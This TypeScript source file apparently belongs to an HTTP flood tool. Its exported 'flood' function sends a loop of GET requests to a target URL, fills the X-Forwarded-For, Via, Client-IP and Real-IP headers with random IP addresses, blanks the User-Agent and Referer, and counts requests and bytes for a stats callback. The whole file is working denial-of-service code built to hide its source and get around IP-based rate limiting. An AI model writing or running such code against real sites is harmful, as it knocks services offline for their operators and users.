import { REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const target = url.startsWith("http") ? url : `http://${url}`

  for (let i = 0; i < rpc; i++) {
    try {
      const res = await fetch(target, {
        method: "GET",
        headers: {
          "User-Agent": "null",
          "Referer": "null",
          "X-Forwarded-For": randIp(),
          "Via": randIp(),
          "Client-IP": randIp(),
          "Real-IP": randIp(),
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      onStats(1, 350)
    } catch {}
  }
}
